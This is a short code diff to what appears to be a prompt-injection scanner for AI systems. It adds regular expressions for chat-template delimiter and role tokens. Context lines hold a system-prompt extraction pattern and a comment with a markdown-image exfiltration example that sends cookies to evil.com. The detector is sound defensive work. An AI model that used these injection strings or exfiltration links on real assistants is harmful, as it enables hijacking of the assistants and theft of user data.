@@ -35,6 +35,9 @@ class PromptInjectionScanner:
             r"reveal\s+(?:the\s+)?(?:system|internal)\s+(?:prompt|instructions)",
             re.IGNORECASE,
         ),
+        # Delimiter and role injection patterns
+        re.compile(r"<\|(?:im_start|im_end|endoftext)\|>", re.IGNORECASE),
+        re.compile(r"\[INST\]|\[/INST\]", re.IGNORECASE),
         # Detect markdown image extraction injection attempts (e.g. ![leak](http://evil.com/cookie))
         re.compile(r"!\[.*\]\(http.*\)", re.IGNORECASE),
     ]
